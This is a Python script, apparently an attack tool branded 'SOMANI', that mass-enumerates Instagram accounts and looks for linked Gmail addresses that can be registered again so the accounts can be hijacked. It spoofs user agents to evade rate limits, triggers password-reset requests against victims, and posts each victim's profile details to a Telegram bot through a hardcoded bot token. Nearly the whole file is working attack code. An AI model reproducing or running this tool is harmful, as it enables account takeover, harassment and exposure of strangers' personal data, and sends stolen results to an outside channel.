import sys
import time

# ANSI Color Codes for Styling
CYAN = "\033[96m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
BOLD = "\033[1m"
RESET = "\033[0m"
import time
time.sleep(2)
import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
import gzip
import secrets
from threading import Thread
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from cfonts import render, say
from colorama import Fore, Style, init
import datetime
import httpx
from urllib.parse import urlencode as _urlencode
import datetime as dt
import requests
import webbrowser

init(autoreset=True)

def style_text(text):
    normal = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    styled = '𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗'
    mapping = str.maketrans(normal, styled)
    return text.translate(mapping)

# Premium Theme Color Scheme
CYAN = '\033[96m'
MAGENTA = '\033[95m'
WHITE = '\033[97m'
GREY = '\033[90m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'

c1 = CYAN
white = WHITE
z = RED
p1 = MAGENTA

os.system('clear')

print(f"{CYAN}⚡ {style_text('SOMANI PREMIUM')} {GREY}│ {WHITE}Initializing systems...")
time.sleep(1.5)

os.system('clear')

CONFIG = {'google_url': 'https://accounts.google.com', 'token_file': 'tl.txt', 'form_type': 'application/x-www-form-urlencoded;charset=UTF-8'}
GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
REFERRER_HEADER = 'referer'
ORIGIN_HEADER = 'origin'
AUTHORITY_HEADER = 'authority'
CONTENT_TYPE_HEADER = 'Content-Type'
COOKIE_HEADER = 'Cookie'
USER_AGENT_HEADER = 'User-Agent'
CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'
TOKEN_FILE = 'tl.txt'
instatool_domain = '@gmail.com'

total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}

session = requests.Session()
sess = requests.Session()

# ===== HARDCODED CREDENTIALS =====
BOT_TOKEN = "8101546868:AAGTljOtG2OWWwjdWFi8ox7ZXvb4LdTDSGo"
TELEGRAM_ID = "2136907703"
# =================================

os.system('clear')

def stats():
    try:
        os.system("cls" if os.name == "nt" else "clear")
        try:
            terminal_width = os.get_terminal_size().columns
        except Exception:
            terminal_width = 80
        
        # Clean & Minimal Counter Layout
        print(f'{c1}Hits : [{hits}]{white} ~ {z}Bad:[{bad_insta}]{white} ~ {p1}Bad Email : {bad_email}')
        print(" " * max(0, (terminal_width - len(":: SOMANI ::")) // 2) + f"{CYAN}:: SOMANI ::{RESET}")
        sys.stdout.flush()
    except Exception:
        pass

def Instatool():
    max_retries = 2
    endpoint = '/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB'
    for attempt in range(max_retries + 1):
        try:
            ingilizalfabesiamk = 'abcdefghijklmnopqrstuvwxyz'
            n1 = ''.join((choice(ingilizalfabesiamk) for _ in range(randrange(6, 9))))
            n2 = ''.join((choice(ingilizalfabesiamk) for _ in range(randrange(3, 9))))
            host = ''.join((choice(ingilizalfabesiamk) for _ in range(randrange(15, 30))))
            headers = {'accept': '*/*', 'accept-language': 'en-GB,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded;charset=UTF-8', 'google-accounts-xsrf': '1', 'user-agent': generate_user_agent()}
            res1 = requests.get(f"{CONFIG['google_url']}{endpoint}", headers=headers)
            if res1.status_code != 200:
                continue
            else:
                tok = re.search('data-initial-setup-data=\"%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text)
                if not tok:
                    continue
                else:
                    tl = tok.group(2)
                    cookies = {'__Host-GAPS': host}
                    headers.update({'authority': 'accounts.google.com', 'origin': CONFIG['google_url'], 'referer': f"{CONFIG['google_url']}/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn", 'user-agent': generate_user_agent()})
                    data = {'f.req': f'[\"{tl}\",\"{n1}\",\"{n2}\",\"{n1}\",\"{n2}\",0,0,null,null,\"web-glif-signup\",0,null,1,[],1]', 'deviceinfo': '[null,null,null,null,null,\"NL\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,2,null,0,1,\"\",null,null,2,2]'}
                    response = requests.post(f"{CONFIG['google_url']}/_/signup/validatepersonaldetails", cookies=cookies, headers=headers, data=data)
                    tl_new = response.text.split('\",null,\"')[1].split('\"')[0] if '\",null,\"' in response.text else None
                    if tl_new:
                        tl = tl_new
                    host = response.cookies.get_dict().get('__Host-GAPS', host)
                    with open(CONFIG['token_file'], 'w') as f:
                        f.write(f'{tl}//{host}\n')
                    return True
        except Exception:
            continue
    
    try:
        headers = {'accept': '*/*', 'accept-language': 'en', 'content-type': 'application/x-www-form-urlencoded;charset=UTF-8', 'origin': 'https://accounts.google.com', 'referer': 'https://accounts.google.com/', 'user-agent': generate_user_agent(), 'x-goog-ext-278367001-jspb': '[\"GlifWebSignIn\"]', 'x-same-domain': '1'}
        params = {'rpcids': 'NHJMOd', 'source-path': '/lifecycle/steps/signup/username', 'hl': 'en'}
        email = ''.join((choice('abcdefghijklmnopqrstuvwxyz1234567890.') for _ in range(randrange(16, 26))))
        data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
        response = requests.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute', params=params, headers=headers, data=data)
        tl_match = re.search('\"TL:([^\"]+)\"', response.text)
        if tl_match:
            tl = tl_match.group(1)
            host = ''.join((choice('abcdefghijklmnopqrstuvwxyz') for _ in range(randrange(15, 30))))
            with open(CONFIG['token_file'], 'w') as f:
                f.write(f'{tl}//{host}\n')
            return True
    except Exception:
        pass
    return False

def check_gmail(email):
    global bad_email
    global hits
    try:
        if '@' in email:
            email = email.split('@')[0]
        with open(CONFIG['token_file'], 'r') as f:
            line = f.read().splitlines()[0]
            tl, host = line.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {'authority': 'accounts.google.com', 'accept': '*/*', 'accept-language': 'en-US,en;q=0.9', 'content-type': CONFIG['form_type'], 'google-accounts-xsrf': '1', 'origin': CONFIG['google_url'], 'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}', 'user-agent': generate_user_agent()}
        params = {'TL': tl}
        data = f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        response = sess.post(f"{CONFIG['google_url']}/_/signup/usernameavailability", params=params, cookies=cookies, headers=headers, data=data)
        if '\"gf.uar\",1' in response.text:
            hits += 1
            stats()
            full_email = email + instatool_domain
            username, domain = full_email.split('@')
            InfoAcc(username, domain)
        else:
            bad_email += 1
            stats()
    except Exception:
        return None

def check_email_exists(email):
    try:
        with httpx.Client(http2=True, timeout=10) as client:
            response = client.post('https://i.instagram.com/api/v1/users/check_email/', data={'email': email}, headers={'User-Agent': 'Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
            if response.status_code != 200:
                return False
            data = response.json()
            email_is_taken = data.get('email_is_taken', False)
            allow_shared = data.get('allow_shared_email_registration', False)
            if email_is_taken or allow_shared is True:
                return True
            return False
    except Exception:
        return False

def rest(user):
    try:
        url = 'https://www.instagram.com/async/wbloks/fetch/'
        params = {'appid': 'com.bloks.www.caa.ar.search.async', 'type': 'action', '__bkv': 'cc4d2103131ee3bbc02c20a86f633b7fb7a031cbf515d12d81e0c8ae7af305dd'}
        payload = {
            '__d': 'www',
            '__user': '0',
            '__a': '1',
            '__req': '9',
            '__hs': '20475.HYP:instagram_web_pkg.2.1...0',
            'dpr': '3',
            '__ccg': 'GOOD',
            '__rev': '1032300900',
            '__s': 'nrgu8k:vm015z:oanvx6',
            '__hsi': '7598106668658828571',
            '__dyn': '7xeUjG1mxu1syUbFp41twpUnwgU29zEdEc8co2qwJw5ux609vCwjE1EE2Cw8G1Qw5Mx62G3i1ywOwv89k2C1Fwc60D82Ixe0EUjwGzEaE2iwNwmE2eUlwhEe87q0oa2-azo7u3u2C2O0Lo6-3u2WE5B0bK1Iwqo5p0qZ6goK1sAwHxW1owLwHwGwa6byohw5yweu',
            '__csr': 'gLff3k5T92cDYAyT4Wkxh5bGhjehqjDVuhUCUya8u889hp8ydihrghXG9yGxGm2m9Gu59rxd0KAzy29oKbyUqxyfxOm7VEWfxDKiGgS4Uf98iJ0zGcKEqz89U5G4ry88bxqfzE9UeEGfw34U01oL8dHK0cvN00pOwywQV9o1uO00LYwcjw7Tgvg6Je1rwko2xDg19o68wgwGoaUiw7to66UjgmRw3MXw0yqw0sO8092U0myw',
            '__hsdp': 'n0I43m1iQhGIiFckEKrBZvIj2SKUl8FeSE9Q08xyoC0x80sAw1TK0GU3xU1jE31w9y095waN04Uw',
            '__hblp': '0dO0Coco1ME884u9wcC2t0lUbo22wzx61mDw5Pw4OwsoboK0sm0FE620cizU5W0bAz8W0wEGuq08Owc60C80xu2S0H40jy1dwDzo2Ow61w',
            '__sjsp': 'n0I43m1iQhGIiFckEKrBZvIRh4rHK5iaqSE0AG9yo',
            '__comet_req': '7',
            'lsd': 'AdJv3Nfv2cg',
            '2958': {
                'jazoest': '1032300900',
                '__spin_r': 'trunk',
                '__spin_b': '1769072066',
                '__spin_t': 'comet.igweb.PolarisWebBloksAccountRecoveryRoute',
                '__crn': '{"params":"{\\"server_params\\":{\\"event_request_id\\":\\"3a359125-0214-4c12-9516-8779938e6188\\",\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"47361890900104\\",\\"device_id\\":\\"\\",\\"family_device_id\\":null,\\"waterfall_id\\":\\"69517426-942a-45d2-8ac7-e4f11a60412a\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\",\\"context_data\\":\\"Ac_RWrril-QBHwJ5esJkO0r_7Q6DijxM0ntnpV72Xwb9pwsT_1irnjiemlrD4UrE8SZUidlwtGeIAdKnN9x0Yt2xwljNTR9nNNdvl5IBdQTVzfy-m4keAoyj2DJC0XaijIwHZoblRGk2SZCZqPZ2356akgjRVowNkYgDbwOOxTdeBRyLAz7akj7KXpnBIRKbYdGn7zGOhcNzNlMwLmfvjOpjevZSZ-fPAgKvYAqbbU1igFi7kJW7Lmz8ltK5l-jl6iabxQzMgtEi-Nll6Apb4I-H_6OqU1x7ckCuv-pKy_oPMRzNgvz2omC1ELg5fb6FearpkUsZyWEjsFgUGhmkz-WLIA8CNBXJ10VAC1ypksrM6RXfzZKJqtz569eaxG-dw9FLpDJX0-_wgFqzqYKWtJIdB_GZXwpLD2VLOd-aXfHN0SWjWSI|arm\\"},\\"client_input_params\\":{\\"zero_balance_state\\":null,\\"search_query\\":\\"f{1453}\\",\\"fetched_email_list\\":[],\\"fetched_email_token_list\\":{},\\"sso_accounts_auth_data\\":[],\\"sfdid\\":\\"\\",\\"text_input_id\\":\\"7tzaot:101\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"was_headers_prefill_available\\":0,\\"was_headers_prefill_used\\":0,\\"ig_oauth_token\\":[],\\"android_build_type\\":\\"\\",\\"is_whatsapp_installed\\":0,\\"device_network_info\\":null,\\"accounts_list\\":[],\\"is_oauth_without_permission\\":0,\\"search_screen_type\\":\\"email_or_username\\",\\"ig_vetted_device_nonce\\":\\"\\",\\"gms_incoming_call_retriever_eligibility\\":\\"client_not_supported\\",\\"auth_secure_device_id\\":\\"\\",\\"network_bssid\\":null,\\"lois_settings\\":{\\"lois_token\\":\\"\\"},\\"aac\\":\\"\\"}}"}'
            },
            'params': '{"params":"{\\"server_params\\":{\\"event_request_id\\":\\"3a359125-0214-4c12-9516-8779938e6188\\",\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"47361890900104\\",\\"device_id\\":\\"\\",\\"family_device_id\\":null,\\"waterfall_id\\":\\"69517426-942a-45d2-8ac7-e4f11a60412a\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\",\\"context_data\\":\\"Ac_RWrril-QBHwJ5esJkO0r_7Q6DijxM0ntnpV72Xwb9pwsT_1irnjiemlrD4UrE8SZUidlwtGeIAdKnN9x0Yt2xwljNTR9nNNdvl5IBdQTVzfy-m4keAoyj2DJC0XaijIwHZoblRGk2SZCZqPZ2356akgjRVowNkYgDbwOOxTdeBRyLAz7akj7KXpnBIRKbYdGn7zGOhcNzNlMwLmfvjOpjevZSZ-fPAgKvYAqbbU1igFi7kJW7Lmz8ltK5l-jl6iabxQzMgtEi-Nll6Apb4I-H_6OqU1x7ckCuv-pKy_oPMRzNgvz2omC1ELg5fb6FearpkUsZyWEjsFgUGhmkz-WLIA8CNBXJ10VAC1ypksrM6RXfzZKJqtz569eaxG-dw9FLpDJX0-_wgFqzqYKWtJIdB_GZXwpLD2VLOd-aXfHN0SWjWSI|arm\\"},\\"client_input_params\\":{\\"zero_balance_state\\":null,\\"search_query\\":\\"f{1453}\\",\\"fetched_email_list\\":[],\\"fetched_email_token_list\\":{},\\"sso_accounts_auth_data\\":[],\\"sfdid\\":\\"\\",\\"text_input_id\\":\\"7tzaot:101\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"was_headers_prefill_available\\":0,\\"was_headers_prefill_used\\":0,\\"ig_oauth_token\\":[],\\"android_build_type\\":\\"\\",\\"is_whatsapp_installed\\":0,\\"device_network_info\\":null,\\"accounts_list\\":[],\\"is_oauth_without_permission\\":0,\\"search_screen_type\\":\\"email_or_username\\",\\"ig_vetted_device_nonce\\":\\"\\",\\"gms_incoming_call_retriever_eligibility\\":\\"client_not_supported\\",\\"auth_secure_device_id\\":\\"\\",\\"network_bssid\\":null,\\"lois_settings\\":{\\"lois_token\\":\\"\\"},\\"aac\\":\\"\\"}}"}'
        }
        headers = {'User-Agent': generate_user_agent(), 'Accept-Encoding': 'gzip, deflate, br, zstd', 'sec-ch-ua-full-version-list': '\"Not(A:Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"144.0.7559.76\", \"Google Chrome\";v=\"144.0.7559.76\"', 'sec-ch-ua-platform': '\"Android\"', 'sec-ch-ua': '\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Google Chrome\";v=\"144\"', 'sec-ch-ua-model': '\"23090RA98I\"', 'sec-ch-ua-mobile': '?1', 'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua-platform-version': '\"15.0.0\"', 'origin': 'https://www.instagram.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': 'https://www.instagram.com/accounts/password/reset/', 'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7', 'priority': 'u=1, i', 'Cookie': 'ig_did=886A3671-95EB-4016-9618-6504E3C60331; mid=aV938wABAAGNLqQD0prSU56ivhek; csrftoken=3xQbJVCm8wRdlSXKaXxztd; datr=HXhfaRa1lVxxpoC1K89YyZiA; ig_nrcb=1; wd=406x766'}
        fff = payload['params']
        fff = fff.replace('f{1453}', user)
        payload['params'] = fff
        response = requests.post(url, params=params, data=payload, headers=headers, timeout=15)
        data = response.content
        try:
            data = gzip.decompress(data)
        except:
            pass
        try:
            import brotli
            data = brotli.decompress(data)
        except:
            pass
        r = data.decode('utf-8', errors='ignore')
        if response.status_code == 200:
            return 'Reset ✅'
        else:
            return 'Reset yok'
    except Exception as e:
        return f'Reset Error: {str(e)}'

def check(email):
    global good_ig
    global bad_insta
    try:
        email_exists = check_email_exists(email)
        if email_exists:
            if instatool_domain in email:
                check_gmail(email)
            good_ig += 1
            stats()
        else:
            bad_insta += 1
            stats()
    except Exception:
        bad_insta += 1
        stats()

def date(hy):
    try:
        ranges = [(1279000, 2010), (17750000, 2011), (279760000, 2012), (900990000, 2013), (1629010000, 2014), (2500000000, 2015), (3713668786, 2016), (5699785217, 2017), (8597939245, 2018), (21254029834, 2019)]
        for upper, year in ranges:
            if hy <= upper:
                return year
        return 2023
    except Exception:
        return 2020

def InfoAcc(username, domain):
    global total_hits
    try:
        account_info = infoinsta.get(username, {})
        user_id = account_info.get('pk', 'N/A')
        full_name = account_info.get('full_name', 'N/A')
        followers = account_info.get('follower_count', 'N/A')
        following = account_info.get('following_count', 'N/A')
        posts = account_info.get('media_count', 'N/A')
        bio = account_info.get('biography', 'N/A')
        is_private = account_info.get('is_private', 'N/A')
        registration_year = date(int(user_id)) if user_id != 'N/A' and user_id and str(user_id).isdigit() else 'N/A'
        total_hits += 1
        rest_info = rest(username)
        meta = False
        try:
            if followers != 'N/A' and posts != 'N/A' and (int(followers) >= 20) and (int(posts) >= 2):
                meta = True
        except:
            meta = False
        
        email_full = f"{username}@{domain}"
        
        # Perfect Hit Slip String Structure As Per Requested Format
        info_text = f"""𝐓𝐎𝐎𝐋 𝐁𝐘 #𝙎𝙊𝙈𝘼𝙉𝙄 
≿━━━━༺❀༻━━━━≾  
[👤] Name → {full_name}  
[👥] Username → @{username}  
[📧] Email → {email_full}  
[📈] Followers → {followers}  
[📊] Following → {following}  
[🎞] Posts → {posts}  
[💬] Bio → {bio}  
[🔒] Private → {is_private}  
[🆔] ID → {user_id}  
[📅] Year → {registration_year}  
[⚙️] Meta → {meta}  
[🔗] URL → https://www.instagram.com/{username}  
[📮] Reset → {rest_info}  

≿━━━━༺❀༻━━━━≾"""

        with open('ayan.txt', 'a') as ff:
            ff.write(f'{info_text}\n')
        
        telegram_url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
        inline_keyboard = [
            [
                {'text': '🧑‍💻 Dev', 'url': 'https://t.me/ankneewayz'}, 
                {'text': '📢 Join', 'url': ''}
            ]
        ]
        payload = {
            'chat_id': TELEGRAM_ID, 
            'text': info_text, 
            'reply_markup': json.dumps({'inline_keyboard': inline_keyboard})
        }
        response = requests.post(telegram_url, data=payload, timeout=10)
        if response.status_code != 200:
            pass
    except Exception:
        pass

def gg():
    while True:
        try:
            user_id = str(random.randint(2500000000, 21254029834))
            model_number = str(random.randint(150, 999))
            android_version = random.choice(['23/6.0', '24/7.0', '25/7.1.1', '26/8.0', '27/8.1', '28/9.0'])
            dpi = str(random.randint(100, 1300))
            resolution = f'{random.randint(200, 2000)}x{random.randint(200, 2000)}'
            brand = random.choice(['SAMSUNG', 'HUAWEI', 'LGE/lge', 'HTC', 'ASUS', 'ZTE', 'ONEPLUS', 'XIAOMI', 'OPPO', 'VIVO', 'SONY', 'REALME'])
            build_suffix = str(random.randint(111, 999))
            user_agent = f'Instagram 311.0.0.32.118 Android ({android_version}; {dpi}dpi; {resolution}; {brand}; SM-T{model_number}; SM-T{model_number}; qcom; en_US; 545986{build_suffix})'
            lsd_token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            id = user_id
            headers = {'accept': '*/*', 'accept-language': 'en,en-US;q=0.9', 'content-type': 'application/x-www-form-urlencoded', 'dnt': '1', 'origin': 'https://www.instagram.com', 'priority': 'u=1, i', 'referer': 'https://www.instagram.com/cristiano/following/', 'user-agent': user_agent, 'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query', 'x-fb-lsd': lsd_token}
            variables = {'enable_integrity_filters': True, 'id': user_id, '__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider': True, '__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider': False, '__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider': False, '__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider': False}
            data = {'lsd': lsd_token, 'variables': json.dumps(variables), 'doc_id': '26672929172408668'}
            response = session.post('https://www.instagram.com/api/graphql', headers=headers, data=data, timeout=20)
            if response.status_code == 200:
                try:
                    json_response = response.json()
                    account = json_response.get('data', {}).get('user', {})
                    username = account.get('username')
                    if username:
                        infoinsta[username] = account
                        follower_count = int(account.get('follower_count', 0))
                        if follower_count >= 10:
                            email = f'{username}@gmail.com'
                            check(email)
                except:
                    pass
        except:
            pass

# ===== RESTART LOOP FOR CONTINUOUS RUNNING =====
while True:
    try:
        Instatool()
        threads = []
        for _ in range(40):
            t = Thread(target=gg)
            t.daemon = True
            t.start()
            threads.append(t)
        # Keep main thread alive
        while True:
            time.sleep(60)
            # Check if any threads are still alive, restart if all died
            alive = any(t.is_alive() for t in threads)
            if not alive:
                print("[!] All threads dead. Restarting...")
                break
    except Exception as e:
        print(f"[!] Main loop error: {e}. Restarting in 10s...")
        time.sleep()